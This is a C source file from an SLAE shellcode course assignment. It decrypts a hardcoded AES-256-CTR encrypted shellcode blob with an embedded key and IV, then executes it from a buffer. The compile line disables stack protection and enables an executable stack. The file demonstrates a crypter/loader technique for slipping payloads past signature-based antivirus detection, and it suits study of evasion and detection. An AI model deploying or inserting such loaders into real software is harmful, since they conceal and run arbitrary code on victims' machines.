// SLAE Assignment #7: AES Shellcode Decrypter and Run
// Website:  http://blog.jsiob.com
// SLAE-ID: 1400
// compile:   gcc decshellcode.c -lcrypto -fno-stack-protector -zexecstack -o decshellcode
//
// INPUT:     encrypted shellcode
//            key
//            IV
// OUTPUT:    shellcode (executed)

 
#include <stdio.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
 
void print_bytes (unsigned char arr[], int size)
{
int i;
for (i = 0; i < size; i++)
{
 
printf("\\x%02x", arr[i]);
}
printf("\n");
}
 
int main()
{
EVP_CIPHER_CTX ctx2;
 
// <><><> Input the encrypted shellcode generated from encshellcode executable
unsigned char encshellcode[]=\
"\xe2\x7e\xe7\x9c\x63\x64\x50\x4a\xd5\xee\x8e\xaf\x97\xbb\xc7\x37\xa3\x9f\xcf\xcb\xce\x73\x95\xf5\xb7\x63\x3a\xf3\x91\x06\x19\x5d\xc5\x25\x57\xf2\xca\x50\xce\xd0\x68\xa8\xc5\x12\x28";
 
// <><><> Input the key you used during encryption
// max length 64 characters (512 bits), we will use 32 (256 bits)
// echo "SLAE32" | sha256sum -->> d4ae6e9035250b783dbd758cf7d42980d5134b984945fca1d09cde9749d75ba6
unsigned char key[EVP_MAX_KEY_LENGTH] = "\xd4\xae\x6e\x90\x35\x25\x0b\x78\x3d\xbd\x75\x8c\xf7\xd4\x29\x80\xd5\x13\x4b\x98\x49\x45\xfc\xa1\xd0\x9c\xde\x97\x49\xd7\x5b\xa6";
// <><> <> Input the IV generated during encryption
unsigned char iv[EVP_MAX_IV_LENGTH]="\x2d\x41\x46\x2a\xf8\x32\x9a\x88\xa2\x2a\x90\xea\xb3\xdc\xc9\x3d";
unsigned char decout[sizeof(encshellcode)];
int declen1, declen2;
 
int (*ret)() = (int(*)())decout;
 
EVP_DecryptInit(&ctx2, EVP_aes_256_ctr(), key, iv);
EVP_DecryptUpdate(&ctx2, decout, &declen1, encshellcode, sizeof(encshellcode)-1);
EVP_DecryptFinal(&ctx2, decout + declen1, &declen2);
printf("[*] We have read %d bytes, and generated %d bytes of decrypted output\n", sizeof(encshellcode)-1, declen1+declen2);
printf("\n --- Decrypted shellcode dump ---\n");
BIO_dump_fp(stdout, decout, sizeof(decout)-1);
EVP_CIPHER_CTX_cleanup(&ctx2);
 
EVP_cleanup();
CRYPTO_cleanup_all_ex_data();
 
printf("\n");
print_bytes(decout, sizeof(decout)-1);
printf("Calling decrypted code...\n\n");
ret();
printf("\n\n");
return 0;
}
